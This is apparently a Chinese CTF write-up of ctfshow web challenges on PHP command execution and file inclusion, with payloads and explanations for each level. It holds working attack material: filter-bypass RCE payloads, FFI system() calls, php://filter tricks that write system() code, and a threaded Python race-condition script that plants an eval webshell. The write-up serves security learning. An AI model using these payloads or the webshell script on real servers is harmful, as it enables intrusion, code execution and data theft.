这道题我尝试了不同的方法，因为他没有禁用include的函数，我让他包含了/var/log/nginx/access.log的进行了UA注入，然后用蚁剑进行POST连接，成功的拿到了shell，但是这道题所有的文件打开都是空白，通过将蚁剑的代理到Burpsuite,通过抓包，发现它通过PHP fread函数读取文件内容,但是这道题使用了disable_function函数把fread函数给禁用了，所以打开文件内容是空白
所以这道题还是通过php伪协议拿到flag
```

### web-64/65/66/67/68

```text
这道题flag不在当前目录下，所以需要查看目录
c=print_r(scandir("/"));
```

有一个新的思路,通过PHP的原生类，new一个对象出来，然后echo这个对象

```e.g.
 c=$dir=new DirectoryIterator("/");echo $dir; 
```

##### 

### web-69/70

```text
这道题把绝大多数的打印数组函数给禁用了
所以有两种方法:
1.找到剩余的没有被禁用的数组函数
c=var_export(scandir("."));
2.将数组转化为其他格式，再打印
```

##### implode函数

```text
implode 函数用于将数组的元素连接成一个字符串，数组的每个元素会根据指定的分隔符连接起来。

string implode ( string $glue , array $pieces )

$glue：一个字符串，作为连接数组元素的分隔符。如果你不想要任何分隔符，可以传入空字符串（""）。
$pieces：一个数组，包含要连接的元素。

$array = ["apple", "banana", "cherry"];
$result = implode(", ", $array);
echo $result;  // 输出：apple, banana, cherry

implode($array,",");==implode(",",$array);
逆序也可以使用
```

所以我们先用查看当前目录或者其他目录

```php
echo(implode("--",scandir(".")));
```

也可以转成json格式使用json_encode函数

```php
c=echo json_encode(scandir("/")); 
```

然后读取文件include或者readgzfile

### web-71

```text
这道题采用了将输出内容送到缓冲区，再将缓冲区数据替换，实现flag模糊
所以这道题我们有两种方法：
1.提前将缓冲区数据发送到服务器或者提前输出：

ob_flush()
ob_flush() 函数的作用是将 当前输出缓冲区 的内容发送到浏览器或客户端，但不关闭缓冲区。

ob_end_flush()
ob_end_flush() 函数的作用是 输出当前缓冲区的内容，并关闭输出缓冲区。

2.提前将程序终止，这样数据就不会发送到缓冲区
利用exit();或者die();
```

### web-72

```text
这道题是pwn题，但是记住我会回来的
```

绕过open_basedir

```text
c=?><?php $a=new DirectoryIterator("glob://./*");
foreach($a as $f)
{
   echo($f->__toString().' ');
}
exit(0);
?>
其实不加前面 ?><?php 也是可以的。 eval() 里的语句可以视为在当前 php 文件里加了几条语句，这些语句必须是完整的，即必须以 “ ; ” 或者 “ ?> ” 结尾来结束语句，但是eval里的 “ ?> ” 不会闭合当前 php 文件。
c=$a=new DirectoryIterator("glob://./*");foreach($a as $f){echo ($f->__toString().' ');}exit(0);
```

### web-73

比之前的题多过滤了include,所以采用include_once、require_once绕过

### web-74

```payload
c=$a=new DirectoryIterator("glob://./*");foreach($a as $f){echo ($f->__toString().' ');}exit(0);

c=include('/flagx.txt');exit(0);
```

### web-75/76

本题还通过`include_path`限制了文件包含的路径，无法直接使用`include`包含得到flag信息，于是尝试使用uaf的方式绕过[命令执行](https://so.csdn.net/so/search?q=命令执行&spm=1001.2101.3001.7020)的限制，但是由于本题过滤了`strlen`,因此参照提示信息使用PDO连接MySQL数据库的方式读取flag信息，payload如下。

```payload
$dsn = "mysql:host=localhost;dbname=information_schema";
$db = new PDO($dsn, 'root', 'root');
$rs = $db->query("select database()");
foreach($rs as $row){
        echo($row[0])."|"; 
}exit();

$dsn = "mysql:host=localhost;dbname=information_schema";$db = new PDO($dsn, 'root','root');$rs = $db->query("select database()");foreach($rs as $row){echo($row[0])."|"; }exit();
```

这题可以使用默认的数据库连接，可以不使用WP讲解的ctfraining

下面给查询数据库payload

```text
$dsn = "mysql:host=localhost;dbname=information_schema";
$db = new PDO($dsn, 'root', 'root');
$rs = $db->query("select group_concat(SCHEMA_NAME) from SCHEMATA");
foreach($rs as $row){
        echo($row[0])."|"; 
}exit();

$dsn = "mysql:host=localhost;dbname=information_schema";$db = new PDO($dsn, 'root', 'root');$rs = $db->query("select group_concat(SCHEMA_NAME) from SCHEMATA");foreach($rs as $row){echo($row[0])."|"; }exit();
```

确实查询到了ctfraining,下面是拿到flag的payload

```payload
c=$conn = mysqli_connect("127.0.0.1", "root", "root", "ctftraining"); $sql = "select load_file('/flag36.txt') as a"; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result['a']; } exit();

默认系统库也可以
c=$conn = mysqli_connect("127.0.0.1", "root", "root", "information_schema"); $sql = "select load_file('/flag36.txt') as a"; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result['a']; } exit();
```

### web-77

这题根据题目给的提示，是php的7.4，有着ffi漏洞

```payload
$ffi = FFI::cdef("int system(const char *command);");//创建一个system对象
$a='/readflag > 1.txt';//没有回显的
$ffi->system($a);//通过$ffi去调用system函数

FFI::cdef 方法用于定义 C 函数原型，其中 int system(const char *command); 是 C 语言中 system  函数的声明。system 函数接受一个字符串参数（即Shell命令），并在系统的命令行中执行该命令；

之后执行 /readflag 程序并将其输出重定向到文件 1.txt；

通过 FFI 对象 $ffi 调用了前面定义的 system 函数，并传递了字符串变量 $a 作为参数。也就是说，实际执行的是 Shell 命令 /readflag > 1.txt，效果是在系统中运行 /readflag 程序，并将其输出结果保存到当前目录下的 1.txt 文件中。
```

他会创建1.txt在当前目录下，所以直接通过访问url/1.txt拿到flag

但是这个题根目录下还有一个flag36x.txt为什么不访问这个呢，而且我们怎么知道readflag是一个可执行文件呢？正常的文件导入应该是`cat /readflag > 1.txt`,下面进行测试

```text
c=$ffi = FFI::cdef("int system(const char *command);");$a='cat /readflag > 2.txt';$ffi->system($a);
```

得到一个二进制执行文件(可以通过IDA逆向出它的源码)，我们也可以使用`ls -l`命令查看目录权限

```payload
c=$ffi = FFI::cdef("int system(const char *command);");$a='ls -l > 3.txt';$ffi->system($a);
```

通过逆向可知，这个文件就是帮我们读取flag36x.txt，因为我们本身是www-data没有权限读取flag36x.txt

### web-118

题目：flag在flag.php里面

查看网页源代码发现system(code)，直接可以判定是RCE，直接尝试ls，回显`evil input`,写一个脚本，或者使用bp看一下有什么可以输入，或者说是过滤了什么

```python
import requests
from bs4 import BeautifulSoup
import string

# 要抓取的网页URL
url = 'http://4740d816-292b-431e-b6b8-95d80f2a40c8.challenge.ctf.show/'

# 构造要测试的字符集（包括字母、数字、符号等）
charset = string.ascii_letters + string.digits + string.punctuation

Success_char = ''
Failed_char = ''

# 发送HTTP POST请求的函数
def send_request(code_input):
    try:
        response = requests.post(url, data={'code': code_input})
        return response
    except requests.RequestException as e:
        print(f"请求发生错误: {e}")
        return None

# 主逻辑：遍历字符集，构造输入并分析回显
for char in charset:
    # 发送POST请求并获取回显
    response = send_request(char)

    if response is not None and response.status_code == 200:
        # 解析HTML内容
        soup = BeautifulSoup(response.content, 'html.parser')

        # 获取所有div标签
        paragraphs = soup.find_all('div')

        # 假设当前字符不是evil
        is_evil = False

        # 检查回显内容
        for paragraph in paragraphs:
            text = paragraph.get_text()

            # 如果任意一个div包含 'evil input' 则标记为evil
            if 'evil input' in text:
                is_evil = True
                break

        # 根据检查结果分类字符
        if is_evil:
            print(f"Skipped input (evil): {char}")
            Failed_char += char + '__'
        else:
            print(f"合法input: {char}")
            Success_char += char + '__'
    else:
        if response is not None:
            print(f"请求失败 {response.status_code}")
        else:
            print("请求发生异常")

# 输出最终的合法字符
print(f"成功的字符: {Success_char}")
print(f"失败的字符: {Failed_char}")
```

或者使用bp，bp原先的爆破字符集包含的有些少了，换成下面这个字符集

```charset
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
```

![image-20250225113001126](posts/8087d2e8/images/Web_118_bpBlast.webp)

回显长度少的就是没有被过滤的字符，发现大写字母和一些特殊符号`${}`没有被过滤

那我们就可以用环境变量和路径名来进行RCE，本地搭建类似环境进行模拟

```shell
echo ${PATH}
echo ${PWD}
```

![image-20250225113953341](posts/8087d2e8/images/Web_118_PathPwd.webp)

正常来说，我们使用切片法就可以进行RCE

```shell
echo ${PATH:0:1}
echo ${PATH:0:3}
echo ${PATH:1:1}
echo ${PATH:~0:1}
echo ${PATH:~A}
```

![image-20250225114349068](posts/8087d2e8/images/Web_118_Ubuntu_Path01.webp)

`${PWD}`也是同理

**注意：**使用取反号时，任何字母等同于数字0。

但是这道题把数字过滤了，所以只能使用末尾取字符的方法，题目的路径是`/var/www/html`

所以使用nl查看文件，flag.php使用`????.???`替代得到payload

```payload
${PATH:~A}${PWD:~A} ????.???
```

也有师傅的payload是

```payload
${PATH:~A}${PWD:~A:${##}} ????.???
```

测试得到结果

```shell
echo ${#}   等于0
echo ${##}	等于1
```

### web-119/120/121

这题和上一题差不多但是过滤了PATH,这里就考我们linux的系统环境变量了

|   字符   |                      BASH                       |                         描述                         |
| :------: | :---------------------------------------------: | :--------------------------------------------------: |
|    0     |                      \${#}                      | 可以获取第一个字符，或者加上取反符号获取最后一个字符 |
|    1     |               \$\{#SHLVL}、\${##}               |                    获取第二个字符                    |
|    2     |               \${PHP_VERSION:~A}                |          根据php版本获取，php的版本是7.3.22          |
|    3     |                    \${#IFS}                     |                  linux下是3，mac是4                  |
|   4/5    |                   ${#RANDOM}                    |               linux下，回显大多是4、5                |
|    5     |                    \${#HOME}                    |                    取/root的长度                     |
|    a     |                   \${USER:~A}                   |                  www-data的最后一位                  |
|    v     |              \${PWD:\${##}:\${##}}              |                /var/www/html的第二位                 |
|    t     |        \${USER:~\$\{#SHLVL}:\${#SHLVL}}         |           www-data先取~1:1也就是倒数第二位           |
|    t     |         \${HOME:\${HOSTNAME}:\${SHLVL}}         |                   这个要看主机名字                   |
|    ?     |                  ${#HOSTNAME}                   |                     主机名字长度                     |
|    /     | \${PWD::\$\{#SHLVL}}、\${PWD:\${#}:\$\{#SHLVL}} |                /var/www/html的第一位                 |
|    n     |                   \${PATH:~A}                   |              获取环境变量的最后一个字符              |
| 错误代码 |                      ${$?}                      |           可以通过先报错，然后执行拿到代码           |

**`$?`**

+ 获取上一次执行错误的错误代码

![image-20250310165048016](posts/8087d2e8/images/web_121_ErrorCode.webp)

```ErrorCode
"OS error code   1:  Operation not permitted"
"OS error code   2:  No such file or directory"
"OS error code   3:  No such process"
"OS error code   4:  Interrupted system call"
"OS error code   5:  Input/output error"
"OS error code   6:  No such device or address"
"OS error code   7:  Argument list too long"
"OS error code   8:  Exec format error"
"OS error code   9:  Bad file descriptor"
"OS error code  10:  No child processes"
"OS error code  11:  Resource temporarily unavailable"
"OS error code  12:  Cannot allocate memory"
"OS error code  13:  Permission denied"
"OS error code  14:  Bad address"
"OS error code  15:  Block device required"
"OS error code  16:  Device or resource busy"
"OS error code  17:  File exists"
"OS error code  18:  Invalid cross-device link"
"OS error code  19:  No such device"
"OS error code  20:  Not a directory"
"OS error code  21:  Is a directory"
"OS error code  22:  Invalid argument"
"OS error code  23:  Too many open files in system"
"OS error code  24:  Too many open files"
"OS error code  25:  Inappropriate ioctl for device"
"OS error code  26:  Text file busy"
"OS error code  27:  File too large"
"OS error code  28:  No space left on device"
"OS error code  29:  Illegal seek"
"OS error code  30:  Read-only file system"
"OS error code  31:  Too many links"
"OS error code  32:  Broken pipe"
"OS error code  33:  Numerical argument out of domain"
"OS error code  34:  Numerical result out of range"
"OS error code  35:  Resource deadlock avoided"
"OS error code  36:  File name too long"
"OS error code  37:  No locks available"
"OS error code  38:  Function not implemented"
"OS error code  39:  Directory not empty"
"OS error code  40:  Too many levels of symbolic links"
"OS error code  42:  No message of desired type"
"OS error code  43:  Identifier removed"
"OS error code  44:  Channel number out of range"
"OS error code  45:  Level 2 not synchronized"
"OS error code  46:  Level 3 halted"
"OS error code  47:  Level 3 reset"
"OS error code  48:  Link number out of range"
"OS error code  49:  Protocol driver not attached"
"OS error code  50:  No CSI structure available"
"OS error code  51:  Level 2 halted"
"OS error code  52:  Invalid exchange"
"OS error code  53:  Invalid request descriptor"
"OS error code  54:  Exchange full"
"OS error code  55:  No anode"
"OS error code  56:  Invalid request code"
"OS error code  57:  Invalid slot"
"OS error code  59:  Bad font file format"
"OS error code  60:  Device not a stream"
"OS error code  61:  No data available"
"OS error code  62:  Timer expired"
"OS error code  63:  Out of streams resources"
"OS error code  64:  Machine is not on the network"
"OS error code  65:  Package not installed"
"OS error code  66:  Object is remote"
"OS error code  67:  Link has been severed"
"OS error code  68:  Advertise error"
"OS error code  69:  Srmount error"
"OS error code  70:  Communication error on send"
"OS error code  71:  Protocol error"
"OS error code  72:  Multihop attempted"
"OS error code  73:  RFS specific error"
"OS error code  74:  Bad message"
"OS error code  75:  Value too large for defined data type"
"OS error code  76:  Name not unique on network"
"OS error code  77:  File descriptor in bad state"
"OS error code  78:  Remote address changed"
"OS error code  79:  Can not access a needed shared library"
"OS error code  80:  Accessing a corrupted shared library"
"OS error code  81:  .lib section in a.out corrupted"
"OS error code  82:  Attempting to link in too many shared libraries"
"OS error code  83:  Cannot exec a shared library directly"
"OS error code  84:  Invalid or incomplete multibyte or wide character"
"OS error code  85:  Interrupted system call should be restarted"
"OS error code  86:  Streams pipe error"
"OS error code  87:  Too many users"
"OS error code  88:  Socket operation on non-socket"
"OS error code  89:  Destination address required"
"OS error code  90:  Message too long"
"OS error code  91:  Protocol wrong type for socket"
"OS error code  92:  Protocol not available"
"OS error code  93:  Protocol not supported"
"OS error code  94:  Socket type not supported"
"OS error code  95:  Operation not supported"
"OS error code  96:  Protocol family not supported"
"OS error code  97:  Address family not supported by protocol"
"OS error code  98:  Address already in use"
"OS error code  99:  Cannot assign requested address"
"OS error code 100:  Network is down"
"OS error code 101:  Network is unreachable"
"OS error code 102:  Network dropped connection on reset"
"OS error code 103:  Software caused connection abort"
"OS error code 104:  Connection reset by peer"
"OS error code 105:  No buffer space available"
"OS error code 106:  Transport endpoint is already connected"
"OS error code 107:  Transport endpoint is not connected"
"OS error code 108:  Cannot send after transport endpoint shutdown"
"OS error code 109:  Too many references: cannot splice"
"OS error code 110:  Connection timed out"
"OS error code 111:  Connection refused"
"OS error code 112:  Host is down"
"OS error code 113:  No route to host"
"OS error code 114:  Operation already in progress"
"OS error code 115:  Operation now in progress"
"OS error code 116:  Stale NFS file handle"
"OS error code 117:  Structure needs cleaning"
"OS error code 118:  Not a XENIX named type file"
"OS error code 119:  No XENIX semaphores available"
"OS error code 120:  Is a named type file"
"OS error code 121:  Remote I/O error"
"OS error code 122:  Disk quota exceeded"
"OS error code 123:  No medium found"
"OS error code 124:  Wrong medium type"
"OS error code 125:  Operation canceled"
"OS error code 126:  Required key not available"
"OS error code 127:  Key has expired"
"OS error code 128:  Key has been revoked"
"OS error code 129:  Key was rejected by service"
"OS error code 130:  Owner died"
"OS error code 131:  State not recoverable"
"MySQL error code 132: Old database file"
"MySQL error code 133: No record read before update"
"MySQL error code 134: Record was already deleted (or record file crashed)"
"MySQL error code 135: No more room in record file"
"MySQL error code 136: No more room in index file"
"MySQL error code 137: No more records (read after end of file)"
"MySQL error code 138: Unsupported extension used for table"
"MySQL error code 139: Too big row"
"MySQL error code 140: Wrong create options"
"MySQL error code 141: Duplicate unique key or constraint on write or update"
"MySQL error code 142: Unknown character set used"
"MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table"
"MySQL error code 144: Table is crashed and last repair failed"
"MySQL error code 145: Table was marked as crashed and should be repaired"
"MySQL error code 146: Lock timed out; Retry transaction"
"MySQL error code 147: Lock table is full;  Restart program with a larger locktable"
"MySQL error code 148: Updates are not allowed under a read only transactions"
"MySQL error code 149: Lock deadlock; Retry transaction"
"MySQL error code 150: Foreign key constraint is incorrectly formed"
"MySQL error code 151: Cannot add a child row"
"MySQL error code 152: Cannot delete a parent row"
```

**SHLVL** 

+ 记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时\${SHLVL}=1，然后在此shell中再打开一个shell时\${SHLVL}=2。

**RANDOM**

+ 此变量值，随机出现整数，范围为0-32767。在Linux中，\${#xxx}显示的是这个值的位数，**不加#是变量的值，加了#是变量的值的长度。**例如\${#12345}的值是5，而random函数绝大部分产生的数字都是4位或者5位的，因此\${#RANDOM}可以代替4或者5。

**IFS**

+ 空格符、tab字符、换行字符(newline) 长度为3，在mac里面是4。\${#IFS}=3

那我们这道题就直接使用linux自带的/bin/cat查看文件，还可以使用/bin/base64编码转化查看,也可以像类似于web55-56题的做

```payload
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
/???/?a? ????.???
/bin/cat flag.php
```

上面这个会执行`cat /bin/cat`程序有一堆回显，下面这个只回显执行程序

```payload
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}??${USER:~${#SHLVL}:${#SHLVL}} ????.???
/???/??t ????.???
/bin/cat flag.php
```

或者使用base64也行

```payload
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
/???/?????4 ????.???
/bin/base64 flag.php
```

使用bzip2也行

```payload
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}???${PWD::${#SHLVL}}????${PHP_VERSION:~A} ????.???
```

加一个rev也行（因为他的网站根目录大概率是/var/www/html）

```payload
${PWD::${##}}???${PWD::${##}}??${PWD:${##}:${##}} ????.???
```

然后访问url/flag.php.bz2就可以拿到flag.php的bz2压缩包了

使用/bin/sh的临时文件命令执行也可以

跟56题一样的套路，先拿到网页文件上传模板，然后进行临时文件爆破（这里有个小技巧，选字母顺序靠前的爆破）

![image-20250225205707088](posts/8087d2e8/images/web_129_bp_TempBlast.webp)

### web-122

没禁HOME和RANDOM，再利用`$?`进行RCE

```payload
<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???

/???/?????4 ????.???
/bin/base64 flag.php
```

### web-124



## 文件包含

### web-78

```text
常规文件包含命令执行，和上面差不多
```

### web-79

```text
跟常规的命令执行一样，伪协议或者UA注入

但是wp给了一个新的方法
远程加载，先用file=https://www.baidu.com/robots.txt
发现可以正常读取，那我们搞一个，自己网站的命令执行文件,然后file参数传入成功进行远程命令执行
```

### web-80/81

过滤了php和data数据，但是这个过滤函数str_replace直接用大小写绕过就行了，就算它全部过滤了，因为他是include函数，还可以用UA日志注入

### web-82

这道题是条件竞争，建议自己搭一个环境测试一下

经过我的测试，因为我的本地网站系统使用linux集成式软件xampp搭建的，(php8.2.1)

版本有点高了，有些配置需要自己修改，下面说，session条件竞争文件包含需要的环境

```text
session.upload_progress.enabled = on
session.upload_progress.cleanup = on
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
session.use_strict_mode=off
```

如果是自己本地网站测试环境，建议先搭一个phpinfo文件方便查看

```text
session.upload_progress.enabled = on
enable = on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中;
cleanup = on表示当文件上传结束后，php将会立即清空对应session文件中的内容
prefix = "upload_progress_"和name = "PHP_SESSION_UPLOAD_PROGRESS"说明session文件里面有一个键值对是upload_progress_PHP_SESSION_UPLOAD_PROGRESS,然而PHP_SESSION_UPLOAD_PROGRESS可以被我们赋值，我们上传一个PHP_SESSION_UPLOAD_PROGRESS=<?php system('ls');?>
upload_progress_<?php system('ls');?>这个注入语句将会被执行
session.use_strict_mode=off
这个表示我们可以自定义PHPSESSID,这个自定义可以方便我们访问session文件,因为session文件一般被保存在/tmp/sess_PHPSESSID
但是由于cleanup的存在session的文件内容留不住，所以这时候我们就需要条件竞争,在cleanup发挥作用之前，访问session文件，拿到回显
```

![PHPSESSIDsuccess](posts/8087d2e8/images/PHPSESSIDsuccess.webp)

![sessionContent](posts/8087d2e8/images/sessionContent.webp)

但是这道题只让我们传一个GET参数，所以我们要构造一个上传脚本

```php+HTML
<!DOCTYPE html>
<html>

<body>
    <form action="http://e0d68fd7-4a51-464c-a3b5-30294653a7f9.challenge.ctf.show/" method="POST"
        enctype="multipart/form-data">
        <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php system('ls'); ?>" />
        <input type="file" name="file" />
        <input type="submit" value="submit" />
    </form>
</body>

</html>
```

然后通过Bp攻击者模块使用NULLpayload模式发送命令执行的网页请求和访问session文件请求，当条件竞争成功时就可以拿到命令执行的回显

这道题还可以不用Bp直接写python脚本

#### Session文件包含Exp脚本编写

```python
import requests
import threading
import io

url = "http://7290b874-9f1e-42ef-80bf-510f861b977d.challenge.ctf.show/"
sessID = 'yyssh'
data = {
    "1": "file_put_contents('/var/www/html/shell.php', '<?php eval($_POST[2]);?>');"  # read()中需要post的内容
}


def write(session):
    fileBytes = io.BytesIO(b'a' * 1024 * 50)
    while True:
        res = session.post(url,
                           data={
                               'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[1]);?>'
                               # 改参数的值就是/tmp/sess_rikka文件的内容
                           },
                           cookies={
                               "PHPSESSID": sessID
                           },
                           files={
                               'file': ('a.webp', fileBytes)
                           }
                           )


def read(session):
    while True:
        res1 = session.post(url + '?file=/tmp/sess_' + sessID, data=data,
                            cookies={
                                "PHPSESSID": sessID
                            })
        res2 = session.get(url + 'shell.php')
        if res2.status_code == 200:
            print("ExpSuccess")
            print(res2.text)
        else:
            print(f"{res2.status_code}: {res2.text}")


if __name__ == '__main__':
    event = threading.Event()  # 开启多线程的对象
    with requests.session() as session:
        for i in range(5):  # 开5个线程
            threading.Thread(target=write, args=(session,)).start()
        for i in range(5):
            threading.Thread(target=read, args=(session,)).start()

        event.set()  # 唤醒线程
```

下面是对一些函数的介绍,以及脚本思路

```introduce
首先我们要拿到webshell，肯定不能用条件竞争的session文件，因为蚁剑要一直利用后门发送命令,条件竞争的文件只能被访问的时候存在
所以我们要利用条件竞争创建一个后门文件，也就是说我们要在sess_PHPSESSID文件里面写入PHP_SESSION_UPLOAD_PROGRESS=<?php @eval($_POST[1]);?>进行任意命令执行,在读取文件sess_PHPSESSID的data={"1":"file_put_contents('/var/www/html/shell.php','<?php @eval($_POST[2]);?>')"},这样我们就可以直接连接url/shell.php就可以了

fileBytes = io.BytesIO(b'a' * 1024 * 50)
创建一个虚拟文件大小为50kb
```

### web-83/84/85

这里解释一下为什么对我们的脚本没有影响，他用了两个函数`session_unset(),session_destory()`试图拦住我们的session文件包含，但是条件竞争的特点就是一直包含，也就是不存在时间段，你的文件被删除或者覆盖，因为它只执行一次覆写或者删除操作，而脚本在一直发送session文件

### web-86

这里也很sb，它搞一个`set_include_path(包含路径)`)函数，使你在使用`include\require`函数的时候使用他的包含路径查找文件,但是你如果使用绝对路径进行`include\require`，他这个`set_include_path`函数就会失效

### web-87

这道题是一个标准的`死亡exit`绕过,我们一般采用php伪协议filter绕过,他前面看似用`str_replace`对我们的伪协议进行了过滤，但是他最后又给了一个url解码与`file_put_contents`合并,所以我们只用采用两次url编码就可以绕过前面的`str_replace`(这里提一嘴，网上url编码的工具大多会保留字母，可以采用Bp自带的url编码工具，把参数全编码)，后面的die也就是我们的死亡exit绕过，采用base64解码绕过，他会将`file_put_contents`后面的参数进行base64解码，(base64 编码范围是 0 ~ 9，a ~ z，A ~ Z，+，/ ，=，所以除了这些字符，其他字符都会被忽略)，那后面就变成了phpdie,(由于 base64 是4个一组，而 **phpdie** 只有六个，所以要加两个字母凑足base64的格式。)

下面给payload：

```payload
file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%33%32%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30
php://filter/write=convert.base64-decode/resource=123.php

contents=PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTs/Pg==
<?php system('tac fl0g.php');?>
```

### web-88

```text
data伪协议，UA注入
```

### web-116

题目提示：misc+lfi（local file Inclusion）

也就是杂项加上文件包含，把视频下载下来，用formost提取文件，得到图片

![image-20250224212334717](posts/8087d2e8/images/web_116_bypass.webp)

看图片的信息，file这个参数就是`file_get_contents`的绕过点，没过滤filter那就直接进行明文读取

php://filter可以获取指定文件源码

```php
?file=php://filter/resource=flag.php
```

### web-117

题目：依然是文件包含，但是过滤了许多命令

跟87题类似，没有过滤`filter`但是过滤了一些编码，string和base64都被过滤了，但是`convert.iconv.`这个没有被过滤，所以我们使用这个过滤器的转化格式

在本地的php环境，搭建一个转换格式，用ucs-2be编码格式转换为ucs-2le编码格式

**注意：**这两个编码格式的内容字数都需要偶数

```php
<?php
$file='php://filter//convert.iconv.ucs-2be.ucs-2le/resource=1.php';
$a=file_get_contents($file);
echo $a;
?>
```

我们php里面写入我们要执行的一句话木马，或者直接查看flag都可以

```php
<?php system('cat flag.php')?>
```

我们就得到了paylaod的编码形式`?<hp pystsme'(ac tlfgap.ph)'>?`

然后跟87题一样就可以了

```payload
?file=php://filter//convert.iconv.ucs-2be.ucs-2le/resource=1.php
contents=?<hp pystsme'(ac tlfgap.ph)'>?
```

### web-124

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 收集自网络
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-06 14:04:45

*/

error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

先审计一下代码。限制了输入长度不能超过80，设置了黑名单和白名单，白名单是一些数学函数。

白名单里有一些进制转换的函数，可以利用来构造我们需要的字符。

我们想要让他执行命令，如system($cmd)。为了绕过对字符的限制，可以用get或post再次传参，用白名单的字符串作为参数名。

我们需要两个参数，一个传递函数名，一个传递函数参数值。（这里选择_GET，因为长度短，题目中有长度限制）

```
$_GET['a']($_GET['b']);
```

整体来说就是：`$_GET['a']($_GET['b']);$a=system&$b=cat flag`

（注：`$a=system&$b=cat flag`不受长度限制，它已经是另外的参数了，不是c的传参内容）

黑名单有中括号，可以用大括号`{}`代替：`$_GET{'a'}($_GET{'b'});$a=system&$b=cat flag`

又因为白名单中只允许特定的函数通过，所以只能把我们的函数进行编码或者替换

`_GET`转换为十六进制为`0x5f474554`

可以利用数学函数，由十进制转成字符。这需要用到两个函数dechex()、hex2bin()。
`_GET`=`hex2bin(dechex(1598506324))`

```
dechex()：十进制转十六进制
hex2bin()：十六进制转二进制，返回 ASCII 字符
```

但是第二个函数hex2bin，白名单里没有，不过白名单里有一个base_convert。

> base_convert(number,frombase,tobase)：可以在任意进制之间转换数字

那我们就直接使用base_convert把hex2bin函数转换出来

`base_convert('hex2bin',36,10)`=>37907361743
`base_convert(37907361743,10,36)`=>hex2bin

这里base_convert为什么写36进制，是因为数字一共10个，字母（不区分大小写）一共26个，为了能把所有字符都表示进来，就是10+26=36。不理解的可以想一下16进制就是10+6个字母
其实本题也可以写成34，因为hex2bin里排序最靠后的字母`x`就在第34的位置。

> _GET=base_convert(37907361743,10,36)(dechex(1598506324))

我们就构成了初步的payload：

```
?c=$base_convert(37907361743,10,36)(dechex(1598506324)){'a'}($$base_convert(37907361743,10,36)(dechex(1598506324)){'b'});$a=system&$b=cat flag
```

结果这样超过了80的长度，因为后面_GET重写增加长度了，所以我们设置一个变量等于\_GET,又因为白名单限制，所以设置一个$pi=\_GET,因为所有大小写字符下划线和一些特殊字符全被过滤筛选，变量设置全部替换成白名单

最终payload：

```
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});&abs=system&acos=cat flag.php
```

其他payload:

```
?c=$pi=base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)(){1})

//上面实际请求就是?c=system(getallheaders(){1})
//要在请求头里面加一个  1: tac flag.php  见下图
```

![image-20250319203851931](posts/8087d2e8/images/web_124_AddHeader.webp)

![image-20250319204004555](posts/8087d2e8/images/web124_Bp_AddHeader.webp)



## php特性

### 常见php魔术方法

#### ____wakeup

在PHP中，`__wakeup` 是一个魔术方法（Magic Method），它在反序列化（unserialize）一个对象时自动调用。

### php中常用的原生类

##### Error/Exception

- Error只适用于php7版本
- Exception适用于php5和php7版本
- 在开启报错的情况下

**Error/Exception（类属性/类里定义的变量)：**

- message：错误消息内容
- code：错误代码
- file：抛出错误的文件名
